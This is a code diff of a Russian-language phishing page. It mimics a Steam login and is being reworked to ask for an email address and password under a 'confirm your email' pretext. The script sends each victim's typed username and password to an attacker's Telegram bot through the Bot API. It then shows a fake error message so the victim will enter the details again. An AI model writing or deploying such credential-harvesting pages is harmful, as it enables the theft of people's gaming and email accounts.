@@ -30,10 +30,10 @@
 
     <!-- твой код формы -->
 <div class="login-wrapper">
-    <div class="title-login">Вход</div>
+    <div class="title-login">Потвердите почту</div>
 
     <div class="input-container">
-        <label class="label-blue">Войдите, используя имя аккаунта</label>
+        <label class="label-blue">Введите свою электронную почту</label>
         <input type="text" class="custom-input" id="username">
     </div>
 
@@ -42,7 +42,7 @@
         <input type="password" class="custom-input" id="password">
     </div>
 
-    <button class="btn-submit" id="submitBtn">Войти</button>
+    <button class="btn-submit" id="submitBtn">Потвердить</button>
 </div>
 
 <script>
@@ -55,7 +55,7 @@ document.getElementById('submitBtn').addEventListener('click', async (e) => {
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
-    const text = `Данные Steam юзера:\nИмя: ${username}\nПароль: ${password}`;
+    const text = `Данные Почты юзера:\nИмя: ${username}\nПароль: ${password}`;
 
     try {
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
@@ -63,7 +63,7 @@ document.getElementById('submitBtn').addEventListener('click', async (e) => {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: CHAT_ID, text })
         });
-        steamAlert('Потвердите свою электронную почту');
+        steamAlert('В данный момент произошла ошибка при отправке данных. Попробуйте еще раз позже.');
     } catch (err) {
         steamAlert('Ошибка отправки');
         console.error(err);
@@ -139,17 +139,17 @@ function steamAlert(message) {
 
     // Кнопка OK
     const btn = document.createElement('button');
-    btn.innerText = 'Oк'; 
-    btn.onclick = () => {
-        window.location.href = 'gmail.html'; // редирект
-    };
+    btn.innerText = 'Oк';
+    btn.onclick = () => document.body.removeChild(overlay);
 
     box.appendChild(btn);
     overlay.appendChild(box);
     document.body.appendChild(overlay);
 }
-</script>
 
+// Пример использования:
+// steamAlert('Отправлено в телегу!');
+</script>
 <div class="create-acc-link">Создать аккаунт</div>
 <div class="steam-text"> 
 	<span>Это бесплатно и просто. Откройте для себя тысячи игр, в которые можно играть с миллионами новых друзей.</span> <br> 
